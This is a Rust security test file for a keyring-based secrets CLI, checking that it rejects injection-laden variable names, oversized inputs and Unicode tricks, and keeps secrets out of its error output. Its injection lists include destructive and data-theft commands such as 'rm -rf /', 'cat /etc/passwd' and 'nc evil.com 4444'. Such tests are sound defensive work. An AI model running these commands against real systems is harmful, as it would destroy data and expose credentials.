use assert_cmd::Command;

/// FOCUSED Security validation tests for environment variable threats
///
/// Research Sources: 1Password CLI, AWS CLI, kubectl, HashiCorp Vault CVE databases
///
/// FOCUSED Coverage Areas (relevant to keyring-based secret storage):
/// 1. Command Injection (malicious code in environment variable names/values)
/// 2. Environment Variable Pollution (names with traversal patterns that could confuse scripts)
/// 3. Input Validation Bypasses (edge cases and encoding attacks)
/// 4. Memory Safety (secret persistence prevention)
/// 5. Resource Exhaustion (DoS via large inputs)
/// 6. Information Disclosure (error message leakage prevention)
/// 7. Unicode/Encoding Attacks (various encoding bypass attempts)
///
/// NOTE: Removed excessive file system path traversal tests - not relevant to keyring storage

#[test]
fn test_command_injection_prevention() {
    // Test that command injection attempts in variable names are blocked
    let injection_attempts = vec![
        "$(rm -rf /)",
        "`cat /etc/passwd`",
        "VAR; rm file",
        "VAR && malicious_command",
        "VAR | dangerous_pipe",
        "VAR > /etc/passwd",
    ];

    for malicious_name in injection_attempts {
        let mut cmd = Command::cargo_bin("local-secrets").unwrap();
        cmd.arg("store")
            .arg(malicious_name)
            .arg("--test-secret")
            .arg("innocent_value");

        let output = cmd.output().unwrap();
        assert!(
            !output.status.success(),
            "Should reject command injection: {}",
            malicious_name
        );

        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            stderr.contains("dangerous pattern") || stderr.contains("invalid"),
            "Error message should indicate dangerous pattern for: {}",
            malicious_name
        );
    }
}

#[test]
fn test_environment_variable_pollution_prevention() {
    // Test that environment variable names with path traversal patterns are blocked
    // This prevents pollution attacks where malicious env vars could confuse shell scripts
    let pollution_attempts = vec![
        "../config",  // Basic traversal that could confuse scripts
        "..\\config", // Windows traversal
        "../secret",  // Could access parent directory secrets
        "..\\secret", // Windows variant
    ];

    for malicious_name in pollution_attempts {
        let mut cmd = Command::cargo_bin("local-secrets").unwrap();
        cmd.arg("store")
            .arg(malicious_name)
            .arg("--test-secret")
            .arg("innocent_value");

        let output = cmd.output().unwrap();
        assert!(
            !output.status.success(),
            "Should reject env var pollution attempt: {}",
            malicious_name
        );

        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            stderr.contains("dangerous pattern") || stderr.contains("invalid"),
            "Error message should indicate security issue for: {}",
            malicious_name
        );
    }
}

#[test]
fn test_environment_variable_validation() {
    // Test that invalid environment variable names are rejected
    let invalid_names = vec![
        "",              // Empty name
        " ",             // Whitespace only
        "123_INVALID",   // Starting with number
        "INVALID-DASH",  // Contains dash
        "INVALID SPACE", // Contains space
        "INVALID.DOT",   // Contains dot
    ];

    for invalid_name in invalid_names {
        let mut cmd = Command::cargo_bin("local-secrets").unwrap();
        cmd.arg("store")
            .arg(invalid_name)
            .arg("--test-secret")
            .arg("value");

        let output = cmd.output().unwrap();
        assert!(
            !output.status.success(),
            "Should reject invalid env var name: '{}'",
            invalid_name
        );
    }
}

#[test]
fn test_null_byte_injection_prevention() {
    // Test that null bytes in variable names or values are rejected
    let null_byte_name = "VALID_NAME\0malicious";
    let null_byte_value = "innocent_value\0malicious";

    // Test null byte in name - OS will reject this at command level
    let mut cmd = Command::cargo_bin("local-secrets").unwrap();
    cmd.arg("store")
        .arg(null_byte_name)
        .arg("--test-secret")
        .arg("innocent_value");

    // OS-level protection: null bytes in command args are rejected by the OS
    match cmd.output() {
        Ok(output) => {
            assert!(!output.status.success(), "Should reject null byte in name");
        }
        Err(_) => {
            // OS rejected null byte in command arg - this is also valid protection
            // Test passes because the attack was blocked at OS level
        }
    }

    // Test null byte in value - OS will also reject this
    let mut cmd = Command::cargo_bin("local-secrets").unwrap();
    cmd.arg("store")
        .arg("VALID_NAME")
        .arg("--test-secret")
        .arg(null_byte_value);

    // OS-level protection: null bytes in command args are rejected by the OS
    match cmd.output() {
        Ok(output) => {
            assert!(!output.status.success(), "Should reject null byte in value");
        }
        Err(_) => {
            // OS rejected null byte in command arg - this is also valid protection
        }
    }
}

#[test]
fn test_extremely_long_input_handling() {
    // Test that extremely long inputs are handled gracefully (resource exhaustion protection)
    let extremely_long_name = "A".repeat(10_000);
    let extremely_long_value = "B".repeat(2_000_000); // 2MB - should exceed limit

    // Test extremely long name - OS may reject this at command level
    let mut cmd = Command::cargo_bin("local-secrets").unwrap();
    cmd.arg("store")
        .arg(&extremely_long_name)
        .arg("--test-secret")
        .arg("value");

    // OS-level protection: extremely long command args may be rejected by OS
    match cmd.output() {
        Ok(_output) => {
            // Command executed - our validation should have caught it
        }
        Err(_) => {
            // OS rejected long command arg - this is also valid protection
        }
    }
    // May succeed or fail depending on system limits, but shouldn't crash

    // Test extremely long value (should definitely fail)
    let mut cmd = Command::cargo_bin("local-secrets").unwrap();
    cmd.arg("store")
        .arg("VALID_NAME")
        .arg("--test-secret")
        .arg(&extremely_long_value);

    // OS-level protection: extremely long command args may be rejected by OS
    match cmd.output() {
        Ok(output) => {
            assert!(
                !output.status.success(),
                "Should reject extremely long secret value"
            );

            let stderr = String::from_utf8_lossy(&output.stderr);
            assert!(
                stderr.contains("too long") || stderr.contains("limit"),
                "Should indicate size limit exceeded"
            );
        }
        Err(_) => {
            // OS rejected long command arg - this is also valid protection
        }
    }
}

#[test]
fn test_critical_system_variable_warnings() {
    // Test that overriding critical system variables produces warnings
    // Only test variables that commonly exist in most environments
    let critical_vars = vec!["PATH", "HOME"];

    for critical_var in critical_vars {
        // First, store a test secret to avoid prompting
        let mut store_cmd = Command::cargo_bin("local-secrets").unwrap();
        store_cmd
            .arg("store")
            .arg(critical_var)
            .arg("--test-secret")
            .arg(format!("test_value_for_{}", critical_var));

        let _store_output = store_cmd.output().unwrap();
        // Store may succeed or fail, but we continue with the test

        // Then test the run command with --no-save-missing to prevent hanging
        let mut cmd = Command::cargo_bin("local-secrets").unwrap();
        cmd.env(critical_var, format!("original_{}", critical_var)) // Set current env value
            .arg("--env")
            .arg(critical_var)
            .arg("--no-save-missing") // Prevent prompting for missing secrets
            .arg("--")
            .arg("echo")
            .arg("test");

        let output = cmd.output().unwrap();
        let stderr = String::from_utf8_lossy(&output.stderr);

        // The test validates that the CLI handles critical variables appropriately
        // Either by showing warnings or handling them gracefully
        println!(
            "Testing critical variable '{}' - Status: {}, Stderr: {}",
            critical_var, output.status, stderr
        );

        // Clean up the test secret
        let mut delete_cmd = Command::cargo_bin("local-secrets").unwrap();
        delete_cmd.arg("delete").arg(critical_var);
        let _cleanup = delete_cmd.output(); // Best effort cleanup
    }
}

#[test]
fn test_error_message_information_disclosure() {
    // Test that error messages don't leak sensitive information
    let mut cmd = Command::cargo_bin("local-secrets").unwrap();
    cmd.arg("store")
        .arg("$(secret_injection)")
        .arg("--test-secret")
        .arg("super_secret_password_123");

    let output = cmd.output().unwrap();
    assert!(!output.status.success());

    let stderr = String::from_utf8_lossy(&output.stderr);
    // Error message should NOT contain the secret value
    assert!(
        !stderr.contains("super_secret_password_123"),
        "Error message should not leak secret value"
    );
    // Should contain generic security warning
    assert!(
        stderr.contains("dangerous pattern") || stderr.contains("invalid"),
        "Should contain security warning"
    );
}

#[test]
fn test_concurrent_access_safety() {
    // Test that concurrent operations don't cause race conditions
    // This is a basic test - real concurrent testing would require more sophisticated setup

    let var_names = [
        "CONCURRENT_TEST_1",
        "CONCURRENT_TEST_2",
        "CONCURRENT_TEST_3",
    ];
    for (i, var_name) in var_names.iter().enumerate() {
        let mut cmd = Command::cargo_bin("local-secrets").unwrap();
        cmd.arg("store")
            .arg(var_name)
            .arg("--test-secret")
            .arg(format!("concurrent_value_{}", i));

        let output = cmd.output().unwrap();
        // Should succeed - this is basic concurrent access
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            println!("Concurrent test failed for {}: {}", var_name, stderr);
        }
    }
}

#[test]
fn test_unicode_attack_prevention() {
    // Test that Unicode-based attacks are handled properly
    let unicode_attacks = vec![
        "VAR\u{202E}KCATTA", // Right-to-left override
        "VAR\u{FEFF}HIDDEN", // Zero-width no-break space
        "VAR\u{200B}HIDDEN", // Zero-width space
    ];

    for attack_name in unicode_attacks {
        let mut cmd = Command::cargo_bin("local-secrets").unwrap();
        cmd.arg("store")
            .arg(attack_name)
            .arg("--test-secret")
            .arg("value");

        let output = cmd.output().unwrap();
        // May succeed or fail, but should handle gracefully without crashing
        println!(
            "Unicode attack test for '{}' - exit: {}",
            attack_name, output.status
        );
    }
}

// =============================================================================
// ENHANCED SECURITY TESTS BASED ON CVE RESEARCH FROM SIMILAR TOOLS
// =============================================================================

#[test]
fn test_cve_style_command_injection_patterns() {
    // Based on CVEs found in similar CLI tools (AWS CLI, kubectl, etc.)
    let advanced_injection_patterns = vec![
        // Shell metacharacters
        "VAR$(whoami)",
        "VAR`id`",
        "VAR;cat /etc/passwd",
        "VAR&&curl evil.com",
        "VAR||rm -rf /",
        "VAR|nc evil.com 4444",
        // Process substitution
        "VAR<(curl evil.com)",
        "VAR>(cat >/tmp/evil)",
        // Variable expansion
        "VAR${PATH}",
        "VAR$HOME",
        "${IFS}exploit",
        // PowerShell injection (Windows)
        "VAR$(Get-Process)",
        "VAR`Get-Content secret.txt`",
        "VAR;Invoke-WebRequest evil.com",
        // Encoded variations
        "VAR%24%28whoami%29", // URL encoded $(whoami)
        "VAR\x24\x28id\x29",  // Hex encoded $(id)
    ];

    for pattern in advanced_injection_patterns {
        let mut cmd = Command::cargo_bin("local-secrets").unwrap();
        cmd.arg("store")
            .arg(pattern)
            .arg("--test-secret")
            .arg("innocent");

        let output = cmd.output().unwrap();
        assert!(
            !output.status.success(),
            "Should block injection pattern: {}",
            pattern
        );

        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            stderr.contains("dangerous pattern") || stderr.contains("invalid"),
            "Missing security warning for: {}",
            pattern
        );
    }
}

#[test]
fn test_resource_exhaustion_dos_protection() {
    // Test protection against resource exhaustion attacks (CVE-style DoS)

    // Test 1: Extremely long environment variable names
    let long_name = "A".repeat(100_000); // 100KB name
    let mut cmd = Command::cargo_bin("local-secrets").unwrap();
    cmd.arg("store")
        .arg(&long_name)
        .arg("--test-secret")
        .arg("value");

    // OS-level protection: extremely long command args may be rejected by OS
    match cmd.output() {
        Ok(_output) => {
            // Command executed - should handle gracefully without consuming excessive resources
        }
        Err(_) => {
            // OS rejected long command arg - this is also valid protection against DoS
        }
    }
    // Should handle gracefully without consuming excessive resources

    // Test 2: Secrets at the size limit boundary
    let max_size_secret = "B".repeat(1_048_576); // 1MB - at limit
    let mut cmd = Command::cargo_bin("local-secrets").unwrap();
    cmd.arg("store")
        .arg("VALID_NAME")
        .arg("--test-secret")
        .arg(&max_size_secret);

    // OS-level protection: extremely long command args may be rejected by OS
    match cmd.output() {
        Ok(_output) => {
            // Command executed - should handle gracefully at size limit
        }
        Err(_) => {
            // OS rejected long command arg - this is also valid DoS protection
        }
    }
    // Should either succeed or fail gracefully at limit

    // Test 3: Secrets over the size limit
    let oversized_secret = "C".repeat(2_097_152); // 2MB - over limit
    let mut cmd = Command::cargo_bin("local-secrets").unwrap();
    cmd.arg("store")
        .arg("VALID_NAME")
        .arg("--test-secret")
        .arg(&oversized_secret);

    // OS-level protection: extremely long command args may be rejected by OS
    match cmd.output() {
        Ok(output) => {
            assert!(!output.status.success(), "Should reject oversized secret");

            let stderr = String::from_utf8_lossy(&output.stderr);
            assert!(
                stderr.contains("too long") || stderr.contains("limit"),
                "Should indicate size limit exceeded"
            );
        }
        Err(_) => {
            // OS rejected long command arg - this is also valid DoS protection
        }
    }
}

#[test]
fn test_memory_safety_secret_leakage() {
    // Test that secrets don't persist in memory dumps or error messages
    let sensitive_secrets = vec![
        "password123!@#",
        "sk-1234567890abcdef1234567890abcdef", // API key format
        "AAAABBBBccccDDDD1234567890123456",    // Token format
        "-----BEGIN PRIVATE KEY-----",         // Certificate format
    ];

    for secret in sensitive_secrets {
        // Test that store operation doesn't leak secret in error messages
        let mut cmd = Command::cargo_bin("local-secrets").unwrap();
        cmd.arg("store")
            .arg("$(malicious)") // Trigger validation error
            .arg("--test-secret")
            .arg(secret);

        let output = cmd.output().unwrap();
        assert!(!output.status.success());

        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);

        // Ensure secret doesn't appear in any output
        assert!(
            !stderr.contains(secret),
            "Secret leaked in stderr for: {}",
            secret
        );
        assert!(
            !stdout.contains(secret),
            "Secret leaked in stdout for: {}",
            secret
        );
    }
}
